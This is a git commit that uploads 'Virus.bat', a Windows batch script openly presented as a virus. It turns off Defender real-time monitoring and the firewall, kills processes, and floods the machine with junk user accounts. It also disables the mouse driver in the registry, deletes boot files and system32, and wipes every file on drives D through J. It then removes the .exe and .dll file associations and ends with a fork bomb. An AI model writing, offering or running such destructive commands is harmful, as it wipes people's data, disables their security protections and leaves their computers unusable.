3da3110035c2cc28bb40d1328d89f4ed19e13d75
Fried Chicken <67384109+MrMe87@users.noreply.github.com>
2023-06-11 02:01:55 -0400

    Add files via upload

---
+++ Virus.bat
@@ -0,0 +1,103 @@
+@echo off
+
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+netsh firewall set opmode disable
+
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+
+net user gwrkjhb /add
+net user jry /add
+net user fried chicken /add
+net user  j /add
+net user dfghn /add
+net user watermelon /add
+net user pokemon cards /add
+net user computerman /add
+net user hfgn /add
+net user dfghn /add
+net user dfgh /add
+net user dfhg /add
+net user dh /add
+net user dhf /add
+net user dfh /add
+net user nvb /add
+net user abcdef /add
+net user ghijklmn /add
+net user opqrstuv /add
+net user wxyz /add
+net user broatpjustlogintouracc /add
+net user dodo /add
+net user ppopy /add
+net user poop /add
+net user laxitive /add
+net user caillou /add
+net user JoeMAMA /add
+net user LOL /add
+net user BUY A NEW COMPUTER /add
+
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+reg delete %key%
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+reg add %key% /v Start /t REG_DWORD /d 4
+
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+
+attrib -r -s -h :c\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+
+del c:\WINDOWS\system32\*.*/q
+del C:\Windows\SysWOW64
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+
+cd /d C:
+md %RANDOM%
+cd /d D:
+md %RANDOM%
+cd /d E:
+md %RANDOM%
+REM #######################
+REM errorcode401.blogspot_in
+
+%0|%0
+
+del C:/windows/desktop
+del C:/windows/pictures
